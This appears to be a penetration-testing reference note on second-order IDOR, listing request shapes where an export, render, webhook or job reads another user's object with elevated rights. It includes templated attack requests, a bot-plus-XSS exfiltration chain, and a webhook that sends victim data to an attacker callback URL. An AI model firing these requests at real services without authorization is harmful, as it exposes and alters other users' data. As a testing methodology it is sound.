# Second-order IDOR — the object reached on the second hop

The unauthorized read/write isn't on the request you sent — it's on a
request the server makes afterward.

---

## 1. The shapes

- A stored id that's dereferenced later (`/render?id=42` → a bot fetches
  `?id=42` as admin).
- An export/report/job that reads the object on the backend (`POST
  /export {"id":42}` → the job reads it with elevated privilege).
- A webhook/callback that fetches the object (`POST /notify {"id":42}`).
- A queued task that processes the object.
- A render/preview/screenshot that loads the object.
- An email/report generator that reads it.
- A "share" that resolves the id on access.

## 2. The bot-as-admin read

```
POST /submit {"url":"/notes/42"}
→ bot visits /notes/42 as admin
→ the page renders A's note
→ XSS exfiltrates
```

The bot's *session* is the second identity. Your `?id=42` request was
read-only; the *bot's* fetch is where the IDOR executes. See
`web-xss` for the exfiltration.

## 3. The export/job read

```
POST /export {"user_id":1, "format":"pdf"}
→ the job reads user 1's data as a service account
→ the PDF lands in your downloads
```

The job runs with a different identity — `user_id` in the job body is
the IDOR. The response is the exported file.

## 4. The render/preview

```
POST /render {"template_id":42}
POST /preview {"id":42}
POST /screenshot {"page":"/notes/42"}
POST /pdf {"url":"/report/42"}
POST /thumbnail {"doc":42}
POST /embed {"object":42}
```

The backend renders the object — your id, the backend's privilege.

## 5. The webhook/callback

```
POST /webhook {"object_id":42, "url":"https://you/cb"}
POST /notify {"resource":42}
POST /subscribe {"feed":"/notes/42"}
POST /watch {"item":42}
POST /follow {"user":1}
POST /track {"order":1}
```

The server fetches the object to build the callback — the fetch is the
second hop.

## 6. The "the import reads" shape

```
POST /import {"source_id":42}
POST /clone {"template_id":42}
POST /copy {"from_id":42}
POST /duplicate {"id":42}
POST /fork {"repo":1}
POST /migrate {"user":1}
POST /sync {"account":1}
POST /restore {"backup":1}
```

The import/clone/copy reads the source object — your id, the backend's
read.

## 7. The "the aggregation reads" shape

```
POST /report {"user_ids":[1]}
POST /analytics {"for_user":1}
POST /stats {"account":1}
POST /summary {"user":1}
POST /digest {"inbox":1}
POST /feed {"timeline":1}
POST /recommend {"for":1}
POST /personalize {"user":1}
POST /insights {"account":1}
```

The aggregation reads another's objects — the `for_user`/`user_ids` is
the IDOR.

## 8. The "the notification reads" shape

```
POST /notify {"user":1, "message":"x"}
POST /alert {"for":1}
POST /remind {"user":1}
POST /email {"to":1}
POST /sms {"to":1}
POST /push {"device":1}
POST /dm {"user":1}
POST /mention {"user":1}
POST /tag {"user":1}
```

The notification reaches another's inbox — a write to their channel.

## 9. The "the search indexes" shape

```
GET /search?q=secret&user=1
POST /index {"user":1}
POST /reindex {"account":1}
POST /crawl {"site":1}
```

The search/index reads another's data to build the index — the result
leaks it.

## 10. The "the cache warms" shape

```
POST /cache/warm {"key":"/notes/42"}
POST /prefetch {"url":"/notes/42"}
POST /preload {"resource":42}
```

The cache warms the object — a subsequent read by you gets it.

## 11. The "the transaction" shape

```
POST /transfer {"from":1, "to":2, "amount":N}
POST /pay {"payer":1}
POST /charge {"account":1}
POST /refund {"order":1}
POST /invoice {"customer":1}
```

The transaction touches another's balance — the `from`/`payer` is the
IDOR. Write-shaped, `pre-probe` blocks it until the write semantics are
understood.

## 12. The "the relationship" shape

```
POST /friend {"user":1}          — befriend another
POST /block {"user":1}
POST /follow {"user":1}
POST /unfollow {"user":1}
POST /trust {"user":1}
POST /grant {"user":1}
POST /share {"object":42, "with":1}
POST /collab {"doc":42, "user":1}
POST /invite {"team":1, "user":1}
POST /add {"group":1, "member":1}
POST /link {"account":1}
POST /merge {"a":1, "b":2}
```

The relationship write touches another's object — the `with`/`member`/
`user` is the IDOR.

## 13. The "the trigger" shape

```
POST /trigger {"job":1}           — run another's job
POST /run {"task":1}
POST /execute {"command":1}
POST /schedule {"cron":1}
POST /cancel {"job":1}
POST /retry {"task":1}
POST /restart {"service":1}
POST /redeploy {"app":1}
POST /rebuild {"image":1}
```

The trigger acts on another's object — the `job`/`task` is the IDOR.

## 14. The "the render returns" shape

The export/render/preview *returns* the object bytes — the response is
the second-hop read. `--evidence-regex` on A's marker in the returned
file.

## 15. The "the callback returns" shape

```
POST /webhook {"object_id":42, "url":"https://you/cb"}
→ the webhook POSTs {"object_id":42,"data":"A-secret"} to you
```

The callback *carries* A's data — the webhook body is the evidence.

## 16. The "the timing" second-order

The job takes `t` for an existing object, `~0` for a missing one — the
export/render's timing is the existence oracle.

## 17. The "the status differential" second-order

`POST /export {"user_id":1}` → `200` (queued) vs `{"user_id":9999}` →
`400`/`404` — the differential is the oracle before the export completes.

## 18. The "the poll the job" second-order

```
POST /export {"user_id":1} → {"job_id":99}
GET /jobs/99 → {"status":"done","file":"/export/99.pdf"}
GET /export/99.pdf → A's data
```

The job's output is the second-hop read — poll the job then read its
file.

## 19. The boundary

The second-hop runs with a *different* identity (bot, service account,
job worker) — the IDOR is that the *first* hop accepted your id and the
second used a privileged read. The proof is the second hop returning
A's data.

## 20. Falsifier

The second hop is also scoped (`export` checks `user_id==session.user`),
or the job's output is per-user. Record `refutes`.
